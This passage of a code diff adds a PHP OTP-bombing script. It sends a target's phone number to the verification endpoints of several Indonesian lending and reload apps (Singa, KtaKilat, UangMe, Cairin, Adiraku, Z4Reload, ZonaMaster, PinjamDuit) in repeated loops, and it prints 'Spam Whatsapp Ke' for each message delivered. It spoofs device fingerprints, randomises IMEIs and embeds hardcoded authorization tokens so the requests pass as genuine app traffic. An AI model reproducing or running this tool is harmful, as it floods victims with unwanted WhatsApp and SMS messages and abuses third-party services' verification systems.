+  echo " PINJAMDUIT ".$response."\n";
+}
+
+
+
+
+//SINGA
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobile_phone":"'.$nomor.'","type":"mobile","is_switchable":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'Success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " SINGA ".$response."\n";
+}
+
+
+
+//KTAKILAT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNo":"'.$nomor.'","smsType":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=UTF-8',
+    'Device-Info:  eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0='
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " KTAKILAT ".$response."\n";
+}
+
+
+
+//UANGME
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.uangme.com/api/v2/sms_code?phone='.$nomor.'&scene_type=login&send_type=wp',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_HTTPHEADER => array(
+    'aid: gaid_15497a9b-2669-42cf-ad10-'.codex(12),
+    'android_id: b787045b140c631f',
+    'app_version: 300504',
+    'brand: samsung',
+    'carrier: 00',
+    'Content-Type: application/x-www-form-urlencoded',
+    'country: 510',
+    'dfp: 6F95F26E1EEBEC8A1FE4BE741D826AB0',
+    'fcm_reg_id: frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo',
+    'gaid: gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0',
+    'lan: in_ID',
+    'model: SM-G965N',
+    'ns: wifi',
+    'os: 1',
+    'timestamp: 1732178536',
+    'tz: Asia%2FBangkok',
+    'User-Agent: okhttp/3.12.1',
+    'v: 1',
+    'version: 28'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"code":"','","');
+if ($result == '200') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " UANGME ".$response."\n";
+}
+
+
+
+//CAIRIN
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'appVersion=3.0.4&phone='.$nomor.'&userImei='.codex(32),
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type: application/x-www-form-urlencoded'
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0"}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CAIRIN ".$response."\n";
+}
+
+
+
+
+//ADIRAKU
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNumber":"'.$nomor.'","type":"prospect-create","channel":"whatsapp"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"message":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ADIRAKU ".$response."\n";
+}
+
+
+//Z4RELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.irmastore.id/apps/otp/v2/sendotpwa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 0,
+  CURLOPT_FOLLOWLOCATION => true,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"hp":"'.$nomor.'","uuid":"MyT2H1xFo2WHoMT5gjdo3W9woys1","app_code":"z4reload"}',
+  CURLOPT_HTTPHEADER => array(
+    'content-type:  application/json',
+    'authorization:  7117c8f459a98282c2c576b519d0662f',
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " Z4RELOAD ".$response."\n";
+}
+
+
+
+//ZONAMASTER
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://zonamaster-smart.smartserver.id/auth/verify/phone',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"','":"');
+if ($result == 'verification_id') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ZONAMASTER ".$response."\n";
+}
+
+
+//PINJAMDUIT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code?clientType=a&appVersion=5.7.3&deviceId=3943BB257996B598232CD792EA3E5D95&hardwareid='.codex(36).'&mobilePhone=&deviceName=SM-G965N&osVersion=9&appName=PinjamDuit&appMarket=google_play',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'phone='.$nomor.'&sms_useage=0&sms_service=2&from=0',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/x-www-form-urlencoded'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0","message":"","data":{"item":{"captchaUrl":"deprecated"}}}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " PINJAMDUIT ".$response."\n";
+}
+
+
+
+
+//SINGA
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobile_phone":"'.$nomor.'","type":"mobile","is_switchable":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'Success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " SINGA ".$response."\n";
+}
+
+
+
+//KTAKILAT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNo":"'.$nomor.'","smsType":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=UTF-8',
+    'Device-Info:  eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0='
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " KTAKILAT ".$response."\n";
+}
+
+
+
+//UANGME
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.uangme.com/api/v2/sms_code?phone='.$nomor.'&scene_type=login&send_type=wp',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_HTTPHEADER => array(
+    'aid: gaid_15497a9b-2669-42cf-ad10-'.codex(12),
+    'android_id: b787045b140c631f',
+    'app_version: 300504',
+    'brand: samsung',
+    'carrier: 00',
+    'Content-Type: application/x-www-form-urlencoded',
+    'country: 510',
+    'dfp: 6F95F26E1EEBEC8A1FE4BE741D826AB0',
+    'fcm_reg_id: frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo',
+    'gaid: gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0',
+    'lan: in_ID',
+    'model: SM-G965N',
+    'ns: wifi',
+    'os: 1',
+    'timestamp: 1732178536',
+    'tz: Asia%2FBangkok',
+    'User-Agent: okhttp/3.12.1',
+    'v: 1',
+    'version: 28'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"code":"','","');
+if ($result == '200') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " UANGME ".$response."\n";
+}
+
+
+
+//CAIRIN
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'appVersion=3.0.4&phone='.$nomor.'&userImei='.codex(32),
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type: application/x-www-form-urlencoded'
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0"}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CAIRIN ".$response."\n";
+}
+
+
+
+
+//ADIRAKU
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNumber":"'.$nomor.'","type":"prospect-create","channel":"whatsapp"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"message":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ADIRAKU ".$response."\n";
+}
+
+
+
+//Z4RELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.irmastore.id/apps/otp/v2/sendotpwa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 0,
+  CURLOPT_FOLLOWLOCATION => true,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"hp":"'.$nomor.'","uuid":"MyT2H1xFo2WHoMT5gjdo3W9woys1","app_code":"z4reload"}',
+  CURLOPT_HTTPHEADER => array(
+    'content-type:  application/json',
+    'authorization:  7117c8f459a98282c2c576b519d0662f',
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " Z4RELOAD ".$response."\n";
+}
+
+
+
+//ZONAMASTER
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://zonamaster-smart.smartserver.id/auth/verify/phone',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"','":"');
+if ($result == 'verification_id') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ZONAMASTER ".$response."\n";
+}
+
+
+//PINJAMDUIT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code?clientType=a&appVersion=5.7.3&deviceId=3943BB257996B598232CD792EA3E5D95&hardwareid='.codex(36).'&mobilePhone=&deviceName=SM-G965N&osVersion=9&appName=PinjamDuit&appMarket=google_play',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'phone='.$nomor.'&sms_useage=0&sms_service=2&from=0',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/x-www-form-urlencoded'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0","message":"","data":{"item":{"captchaUrl":"deprecated"}}}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " PINJAMDUIT ".$response."\n";
+}
+
+
+
+
+//SINGA
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobile_phone":"'.$nomor.'","type":"mobile","is_switchable":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'Success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " SINGA ".$response."\n";
+}
+
+
+
+//KTAKILAT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNo":"'.$nomor.'","smsType":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=UTF-8',
+    'Device-Info:  eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0='
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " KTAKILAT ".$response."\n";
+}
+
+
+
+//UANGME
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.uangme.com/api/v2/sms_code?phone='.$nomor.'&scene_type=login&send_type=wp',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_HTTPHEADER => array(
+    'aid: gaid_15497a9b-2669-42cf-ad10-'.codex(12),
+    'android_id: b787045b140c631f',
+    'app_version: 300504',
+    'brand: samsung',
+    'carrier: 00',
+    'Content-Type: application/x-www-form-urlencoded',
+    'country: 510',
+    'dfp: 6F95F26E1EEBEC8A1FE4BE741D826AB0',
+    'fcm_reg_id: frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo',
+    'gaid: gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0',
+    'lan: in_ID',
+    'model: SM-G965N',
+    'ns: wifi',
+    'os: 1',
+    'timestamp: 1732178536',
+    'tz: Asia%2FBangkok',
+    'User-Agent: okhttp/3.12.1',
+    'v: 1',
+    'version: 28'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"code":"','","');
+if ($result == '200') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " UANGME ".$response."\n";
+}
+
+
+
+//CAIRIN
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'appVersion=3.0.4&phone='.$nomor.'&userImei='.codex(32),
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type: application/x-www-form-urlencoded'
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0"}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CAIRIN ".$response."\n";
+}
+
+
+
+
+//ADIRAKU
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNumber":"'.$nomor.'","type":"prospect-create","channel":"whatsapp"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"message":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ADIRAKU ".$response."\n";
+}
+
+
+//Z4RELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.irmastore.id/apps/otp/v2/sendotpwa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 0,
+  CURLOPT_FOLLOWLOCATION => true,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"hp":"'.$nomor.'","uuid":"MyT2H1xFo2WHoMT5gjdo3W9woys1","app_code":"z4reload"}',
+  CURLOPT_HTTPHEADER => array(
+    'content-type:  application/json',
+    'authorization:  7117c8f459a98282c2c576b519d0662f',
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " Z4RELOAD ".$response."\n";
+}
+
+
+
+//ZONAMASTER
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://zonamaster-smart.smartserver.id/auth/verify/phone',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"','":"');
+if ($result == 'verification_id') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ZONAMASTER ".$response."\n";
+}
+
+
+//PINJAMDUIT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code?clientType=a&appVersion=5.7.3&deviceId=3943BB257996B598232CD792EA3E5D95&hardwareid='.codex(36).'&mobilePhone=&deviceName=SM-G965N&osVersion=9&appName=PinjamDuit&appMarket=google_play',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'phone='.$nomor.'&sms_useage=0&sms_service=2&from=0',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/x-www-form-urlencoded'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0","message":"","data":{"item":{"captchaUrl":"deprecated"}}}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " PINJAMDUIT ".$response."\n";
+}
+
+
+
+
+//SINGA
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobile_phone":"'.$nomor.'","type":"mobile","is_switchable":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'Success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " SINGA ".$response."\n";
+}
+
+
+
+//KTAKILAT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNo":"'.$nomor.'","smsType":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=UTF-8',
+    'Device-Info:  eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0='
+  ),
+));
